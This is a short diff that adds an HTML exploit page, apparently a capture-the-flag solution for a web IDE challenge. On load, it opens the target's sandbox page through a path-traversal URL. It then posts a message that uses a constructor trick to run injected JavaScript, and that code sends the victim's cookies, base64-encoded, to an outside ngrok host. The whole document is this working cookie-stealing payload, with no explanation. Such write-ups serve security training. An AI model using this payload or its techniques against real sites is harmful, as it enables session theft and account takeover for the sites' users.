@@ -1,0 +1,8 @@
+<script>
+  window.onload = () => {
+    let w = window.open("https://web-ide.dicec.tf/ide/..%2f/sandbox.html");
+    setTimeout(() => {
+      w.postMessage(`log.constructor('fetch("https://a94c78fa193e.ngrok.io/b64/" + btoa(document.cookie));')()`, '*');
+    }, 1000);
+  };
+</script>
